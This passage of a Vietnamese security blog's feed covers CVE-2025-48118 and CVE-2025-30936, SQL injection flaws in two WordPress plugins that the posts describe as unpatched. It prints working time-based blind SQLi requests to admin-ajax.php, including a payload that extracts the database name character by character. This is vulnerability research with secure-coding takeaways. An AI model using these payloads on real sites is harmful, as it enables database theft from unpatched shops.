0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i &lt;strong&gt;POST request&lt;/strong&gt; ch·ª©a payload SQLi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/time_resp.png&#34;&#xA;    alt=&#34;time response&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ ph·∫£n h·ªìi khi khai th√°c th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta s·ª≠ d·ª•ng &lt;strong&gt;subquery trong m·ªánh ƒë·ªÅ FROM&lt;/strong&gt; v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, &lt;code&gt;SLEEP&lt;/code&gt; ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác &lt;code&gt;SLEEP&lt;/code&gt; b·ªã nh√¢n nhi·ªÅu l·∫ßn.&lt;/p&gt;&#xA;&lt;p&gt;V√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT SLEEP(5))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë nh√¢n&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_2.png&#34;&#xA;    alt=&#34;search 2&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Th·ªùi gian ph·∫£n h·ªìi tƒÉng theo c·∫•p s·ªë nh√¢n&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ &lt;strong&gt;dump ƒë∆∞·ª£c h·∫øt data&lt;/strong&gt; l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request v·ªõi &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;S·ª≠ d·ª•ng &lt;code&gt;SUBSTRING()&lt;/code&gt; ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;SLEEP(5)&lt;/code&gt; n·∫øu k√Ω t·ª± ƒë√≥ l√† &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng hex encoding &lt;code&gt;w&lt;/code&gt; th√†nh &lt;code&gt;0x77&lt;/code&gt; v√¨ &lt;code&gt;order_id&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ &lt;strong&gt;POST&lt;/strong&gt; request trong n√™n b·ªã escape b·ªüi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; trong WordPress v√† b·ªüi &lt;code&gt;sanitize_text_field&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =&amp;gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-48118&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.3&lt;/strong&gt;, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Ch∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wc-partial-shipment/vulnerability/wordpress-woocommerce-partial-shipment-3-2-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Woocommerce Partial Shipment Plugin &amp;lt;= 3.2 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30936 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-28-cve-2025-30936/</link>
      <pubDate>Sun, 28 Sep 2025 20:51:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-28-cve-2025-30936/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Torod&lt;/strong&gt; c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30936&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30936&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/torod/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Torod Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fixed in&lt;/strong&gt;: &amp;lt;= N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Torod&lt;/strong&gt;: v1.9&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ &lt;strong&gt;POST&lt;/strong&gt; request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-sink&#34;&gt;&lt;span&gt;Vulnerable Sink&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-sink&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng &lt;strong&gt;diff tool&lt;/strong&gt; ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa &lt;strong&gt;code l·ªói&lt;/strong&gt; v√† &lt;strong&gt;code ƒë√£ fix l·ªói&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global &lt;code&gt;$wpdb&lt;/code&gt;, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_sink.png&#34;&#xA;    alt=&#34;Search sink&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;T√¨m v·ªã tr√≠ sink trong code&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ D·ªØ li·ªáu t·ª´ &lt;code&gt;$_POST[&#39;country_id&#39;]&lt;/code&gt; ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng &lt;code&gt;sanitize_text_field()&lt;/code&gt; m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c &lt;strong&gt;escape chu·ªói&lt;/strong&gt;, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Source: &lt;code&gt;$_POST[&#39;country_id&#39;]&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sink: &lt;code&gt;$wpdb-&amp;gt;get_results(&amp;quot;SELECT * FROM $table_name WHERE country_id = $country_id&amp;quot;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;L·ªó h·ªïng n·∫±m trong h√†m &lt;code&gt;get_regions_and_cities&lt;/code&gt; c·ªßa class &lt;code&gt;ajaxyk&lt;/code&gt; thu·ªôc file &lt;strong&gt;inc/ajaxyk.php&lt;/strong&gt;. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;get_regions_and_cities&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_1.png&#34;&#xA;    alt=&#34;Search 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;T√¨m v·ªã tr√≠ h√†m get_regions_and_cities&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ &lt;code&gt;get_regions_and_cities&lt;/code&gt; ƒë∆∞·ª£c construct c·ªßa class &lt;code&gt;ajaxyk&lt;/code&gt; g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m &lt;code&gt;add_action&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_get_regions_and_cities&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p &lt;code&gt;wp_ajax_{$action}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_get_regions_and_cities&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p &lt;code&gt;wp_ajax_nopriv_{$action}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√¨ ƒë√¢y l√† l·ªó h·ªïng &lt;strong&gt;unauthenticated&lt;/strong&gt; n√™n ta ch·ªâ quan t√¢m t·ªõi hook &lt;code&gt;wp_ajax_nopriv_get_regions_and_cities&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y khi g·ª≠i &lt;strong&gt;POST&lt;/strong&gt; request ƒë·∫øn &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi tham s·ªë&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=wp_ajax_nopriv_get_regions_and_cities&amp;amp;country_id=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Callback &lt;code&gt;get_regions_and_cities&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;country_id&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query.&lt;/li&gt;&#xA;&lt;li&gt;Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 